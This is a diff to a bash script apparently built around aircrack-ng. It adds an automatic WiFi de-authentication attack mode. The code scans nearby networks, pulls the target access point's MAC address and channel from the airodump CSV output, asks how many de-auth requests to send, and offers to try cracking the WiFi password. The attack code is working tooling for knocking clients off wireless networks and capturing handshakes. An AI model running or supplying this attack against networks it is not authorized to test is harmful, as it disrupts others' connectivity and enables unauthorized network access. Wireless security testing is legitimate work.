@@ -75,22 +75,53 @@ fi
 start () {
 	echo ""
 	echo "-- SELECT AN OPERATION --"
-	echo "[1] Scan all networks"
-	echo "[2] Show clients connected to network"
-	echo "[3] Attack mode"
+	echo "[1] De-auth attack (automatic)"
+	echo "[2] De-auth attack (manual)"
+	echo "[3] Show clients connected to network"
 	echo "[4] Disable monitor mode for $interfaceMon"
 	echo ""
 	read -p 'Select operation: ' option2
 
-	if [ "$option2" == "1" ]
+	if [ "$option2" == "1" ] # auto attack
 		then
-		sudo airodump-ng $interfaceMon
-		echo "Done."
-	elif [ "$option2" == "2" ]
-		then
-		read -p 'Enter network name (SSID): ' name
-		sudo airodump-ng $interfaceMon --essid $name -a 	
-	elif [ "$option2" == "3" ]
+		sudo rm scan-01.* --force > /dev/null
+		echo "Scanning networks for 10 seconds..."
+		screen -d -m sudo airodump-ng -w scan --output-format csv $interfaceMon
+		sleep 10s
+		sudo killall screen
+		sed -i '1d' scan-01.csv
+		sed -i '1d' scan-01.csv
+		echo ""
+		echo "-- Choose network --"
+		i=1
+		filename=scan-01.csv
+		while read line; do
+			stop=$(echo $line | grep "Station MAC" | wc -l)
+			if [ "$stop" == "1" ]; then
+				break
+			fi
+			mac=${line:0:17}
+			channel=${line:61:2}
+			name=${line: -19}
+			echo "[$i] $mac -> $name"
+			i=$((i+1))
+		done < $filename
+
+		read -p 'Choose network: ' network
+		res=$(sed -n $((network))p scan-01.csv)
+		ap=${res:0:17}
+		channel=${res:61:2}
+		name=${res: -20}
+		echo "Name: $name"
+		echo "Mac: $ap"
+		echo "Channel: $channel"
+		echo ""
+		read -p "De-auth requests (default is 1): " number
+		echo ""
+		read -p "Try to crack WiFi password (y/n)? " capture
+		echo ""
+		deAuth
+	elif [ "$option2" == "2" ] # manual attack
 		then
 		echo ""
 		if [ -f "file" ]
@@ -152,12 +183,16 @@ start () {
 
 		deAuth
 	fi
-elif [ "$option2" == "4" ]
-	then
-	echo "Stoppping interface..."
-	sudo airmon-ng stop $interfaceMon > /dev/null
-	echo "Done."
-fi
+	elif [ "$option2" == "3" ] # show clients
+		then
+		read -p 'Enter network name (SSID): ' name
+		sudo airodump-ng $interfaceMon --essid $name -a 		
+	elif [ "$option2" == "4" ]
+		then
+		echo "Stoppping interface..."
+		sudo airmon-ng stop $interfaceMon > /dev/null
+		echo "Done."
+	fi
 }
 
 deAuth () {
